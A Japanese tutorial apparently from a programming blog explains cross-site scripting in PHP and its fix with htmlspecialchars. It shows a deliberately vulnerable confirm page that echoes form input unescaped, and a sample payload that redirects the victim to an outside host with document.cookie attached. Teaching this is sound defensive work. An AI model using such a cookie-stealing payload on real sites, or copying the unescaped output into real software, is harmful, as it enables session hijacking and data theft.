---
title: "クロスサイトスクリプティング（XSS）とは？攻撃手法と対策（PHP例）"
url: "/programming/xss/"
date: 2020-02-24
categories: 
  - "セキュリティ"
  - "programming"
---

クロスサイトスクリプティング（XSS）は、HTMLの中に悪意のあるJavaScriptのソースコードを埋め込んでスクリプトを実行すること。

この悪意のあるスクリプト実行されることで、Webページの情報の改竄やクッキー情報が盗まれて個人情報流出といったことが起こる。

## 攻撃手法の例

クロスサイトスクリプティング（XSS）は、Webページにあるフォームに入力された文字列がそのままHTMLへ出力されるようなサイトが標的になる。

以下のような登録画面から入力内容を確認する確認画面（confirm.php）へ遷移するアプリケーションがあったとする。

#### ・create.php（登録画面）

```
<h1>登録画面</h1>
<form action="/confirm" method="post">
  <input type="text" name="item">
  <input type="submit" value="確認画面へ">
</form>
```

#### ・confirm.php（確認画面）

```
<h1>確認画面</h1>
登録内容：<?php echo $item; ?>
```

このアプリケーション場合、登録画面で入力した内容がそのまま確認画面へ出力される。

このフォームへ以下の悪意のあるコードを入力したとする。

```
"><script>document.location='http://example.blog.pop-web.net?'+document.cookie;</script>
```

そうすると、document.locationで指定された攻撃者のサイトへリダイレクトされ、そのURLパラメータにクッキー情報が含まれてしまい、個人情報などが盗まれてしまう。

また、XSSはセッションハイジャックの被害にも繋がる。

## 対策方法

クロスサイトスクリプティング（XSS）の対策としては、**HTMLへ出力する際にサニタイズすること。**

サニタイズとは無害化することで、HTML特殊文字をエスケープしてくれる。

例えば、「<」「>」といった文字列を「＆lt;」「＆gt;」へ変換してJavaScriptコードが処理されてないようにしてくれる。

PHPだとサニタイズする関数として**htmlspecialchars関数**がある。使い方はhtmlspecialchars関数の引数にサニタイズしたい文字列をいれるだけ。

さっきのconfirm.phpだと、以下のように修正される。

```
<h1>確認画面</h1>
登録内容：<?php echo htmlspecialchars($item,ENT_QUOTES); ?>
```

こうすることでJavaScriptのコードをフォームに入力して、それを出力しても、ブラウザ上ではただの文字列として表示されることなる。

ちなみに、第二引数の「ENT\_QUOTES」はシングルクオートとダブルクオート共に変換するという指定。一般的に「ENT\_QUOTES」が使われることが多い。
